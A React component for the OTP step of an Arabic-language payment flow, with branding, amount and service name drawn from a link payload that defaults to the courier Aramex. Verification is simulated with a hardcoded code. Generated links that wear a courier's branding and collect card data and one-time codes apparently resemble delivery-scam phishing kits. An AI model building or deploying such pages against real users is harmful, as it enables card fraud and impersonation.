import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { useTheme } from "@/themes/ThemeContext";
import { PaymentHeader, PaymentCard, PaymentButton, PaymentFormField } from "@/components/payment";
import { useLink } from "@/hooks/useSupabase";
import { Shield, ArrowLeft, RotateCcw } from "lucide-react";
import "@/themes/themeStyles.css";

const PaymentOTPTheme = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { theme } = useTheme();
  const { data: linkData } = useLink(id);

  // Get URL parameters
  const urlParams = new URLSearchParams(window.location.search);
  const countryCode = urlParams.get('country') || "SA";
  const currencyCode = urlParams.get('currency') || "SAR";

  const [otp, setOtp] = useState("");
  const [error, setError] = useState("");
  const [isVerifying, setIsVerifying] = useState(false);

  if (!theme) {
    return (
      <div style={{
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center',
        minHeight: '100vh',
      }}>
        <div className="spinner" />
      </div>
    );
  }

  const serviceKey = linkData?.payload?.service_key || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const shippingInfo = linkData?.payload as any;

  // Get amount from shipping info
  const rawAmount = shippingInfo?.cod_amount || 500;
  const amount = typeof rawAmount === 'string' ? parseFloat(rawAmount) : rawAmount;

  const handleVerify = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    setIsVerifying(true);

    // Simulate OTP verification
    setTimeout(() => {
      if (otp === "123456") {
        navigate(`/pay/${id}/receipt?country=${countryCode}&currency=${currencyCode}`);
      } else {
        setError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.");
      }
      setIsVerifying(false);
    }, 1500);
  };

  const handleResend = () => {
    // Simulate resend OTP
    alert("تم إرسال رمز جديد إلى رقم هاتفك");
  };

  const handleBack = () => {
    navigate(`/pay/${id}/card-input?country=${countryCode}&currency=${currencyCode}`);
  };

  const steps = [
    { id: '1', label: 'التفاصيل', description: 'معلومات الدفعة' },
    { id: '2', label: 'المستلم', description: 'بيانات الاستلام' },
    { id: '3', label: 'الدفع', description: 'معلومات البطاقة' },
    { id: '4', label: 'التحقق', description: 'رمز OTP' },
  ];

  return (
    <div className="fade-in" style={{
      minHeight: '100vh',
      backgroundColor: theme.colors.background,
      padding: theme.spacing.md,
    }}>
      {/* Payment Header with Company Branding */}
      <PaymentHeader
        title="التحقق من الهوية"
        subtitle={`خدمة ${serviceName}`}
        showBackButton={true}
        onBackClick={handleBack}
        logoPosition="left"
      />

      <div style={{
        maxWidth: '600px',
        margin: `${theme.spacing.lg} auto`,
        display: 'flex',
        flexDirection: 'column',
        gap: theme.spacing.lg,
      }}>
        {/* Progress Steps */}
        <div className="slide-in">
          <div style={{
            backgroundColor: theme.colors.surface,
            padding: theme.spacing.lg,
            borderRadius: theme.borderRadius.lg,
            border: `1px solid ${theme.colors.border}`,
          }}>
            <div style={{
              display: 'flex',
              justifyContent: 'space-between',
              marginBottom: theme.spacing.md,
            }}>
              <span style={{
                fontSize: theme.fonts.sizes.sm,
                fontWeight: theme.fonts.weights.semibold,
                color: theme.colors.text,
              }}>
                الخطوة 4 من 4
              </span>
              <span style={{
                fontSize: theme.fonts.sizes.xs,
                color: theme.colors.textSecondary || theme.colors.text,
              }}>
                {serviceName}
              </span>
            </div>

            {/* Progress Bar */}
            <div style={{
              width: '100%',
              height: '4px',
              backgroundColor: theme.colors.border,
              borderRadius: theme.borderRadius.full,
              overflow: 'hidden',
            }}>
              <div style={{
                width: '100%',
                height: '100%',
                backgroundColor: theme.colors.primary,
                borderRadius: theme.borderRadius.full,
                transition: 'width 0.5s ease',
              }} />
            </div>
          </div>
        </div>

        {/* OTP Input Form */}
        <div className="slide-in" style={{
          animationDelay: '0.1s',
        }}>
          <PaymentCard
            title="أدخل رمز التحقق"
            subtitle="تم إرسال رمز التحقق إلى رقم هاتفك"
          >
            <form onSubmit={handleVerify}>
              <div style={{
                display: 'flex',
                flexDirection: 'column',
                gap: theme.spacing.lg,
              }}>
                <PaymentFormField
                  label="رمز التحقق (OTP)"
                  type="text"
                  placeholder="123456"
                  value={otp}
                  onChange={(e) => setOtp(e.target.value.replace(/[^0-9]/g, ""))}
                  maxLength={6}
                  error={error}
                  leftIcon={<Shield size={20} />}
                  variant={theme.style.formField as 'outlined' | 'filled' | 'flat'}
                />

                {/* Security Info */}
                <div style={{
                  display: 'flex',
                  alignItems: 'flex-start',
                  gap: theme.spacing.sm,
                  padding: theme.spacing.md,
                  backgroundColor: `${theme.colors.primary}10`,
                  borderRadius: theme.borderRadius.sm,
                  border: `1px solid ${theme.colors.primary}30`,
                }}>
                  <Shield size={16} style={{ color: theme.colors.primary, marginTop: '2px' }} />
                  <div>
                    <div style={{
                      fontSize: theme.fonts.sizes.sm,
                      fontWeight: theme.fonts.weights.medium,
                      color: theme.colors.text,
                      marginBottom: theme.spacing.xs,
                    }}>
                      أمان إضافي
                    </div>
                    <div style={{
                      fontSize: theme.fonts.sizes.xs,
                      color: theme.colors.textSecondary || theme.colors.text,
                      lineHeight: '1.5',
                    }}>
                      رمز التحقق صالح لمدة 5 دقائق فقط. لا تشارك هذا الرمز مع أي شخص.
                    </div>
                  </div>
                </div>

                {/* Error Message */}
                {error && (
                  <div style={{
                    padding: theme.spacing.md,
                    backgroundColor: `${theme.colors.error}15`,
                    border: `1px solid ${theme.colors.error}`,
                    borderRadius: theme.borderRadius.sm,
                    color: theme.colors.error,
                    fontSize: theme.fonts.sizes.sm,
                    textAlign: 'center',
                  }}>
                    {error}
                  </div>
                )}

                {/* Submit Button */}
                <PaymentButton
                  type="submit"
                  variant="primary"
                  size="lg"
                  fullWidth={true}
                  loading={isVerifying}
                  icon={!isVerifying && <Shield size={20} />}
                  disabled={otp.length !== 6 || isVerifying}
                  style={{
                    marginTop: theme.spacing.md,
                  }}
                >
                  {isVerifying ? 'جارٍ التحقق...' : 'تأكيد الرمز'}
                </PaymentButton>

                {/* Resend OTP */}
                <div style={{
                  textAlign: 'center' as const,
                  marginTop: theme.spacing.md,
                }}>
                  <button
                    type="button"
                    onClick={handleResend}
                    style={{
                      background: 'none',
                      border: 'none',
                      color: theme.colors.primary,
                      fontSize: theme.fonts.sizes.sm,
                      fontWeight: theme.fonts.weights.medium,
                      cursor: 'pointer',
                      display: 'inline-flex',
                      alignItems: 'center',
                      gap: theme.spacing.xs,
                      padding: `${theme.spacing.xs} ${theme.spacing.sm}`,
                      borderRadius: theme.borderRadius.sm,
                      transition: 'background-color 0.2s',
                    }}
                    onMouseEnter={(e) => {
                      e.currentTarget.style.backgroundColor = `${theme.colors.primary}10`;
                    }}
                    onMouseLeave={(e) => {
                      e.currentTarget.style.backgroundColor = 'transparent';
                    }}
                  >
                    <RotateCcw size={16} />
                    إعادة إرسال الرمز
                  </button>
                </div>
              </div>
            </form>
          </PaymentCard>
        </div>
      </div>
    </div>
  );
};

export default PaymentOTPTheme;
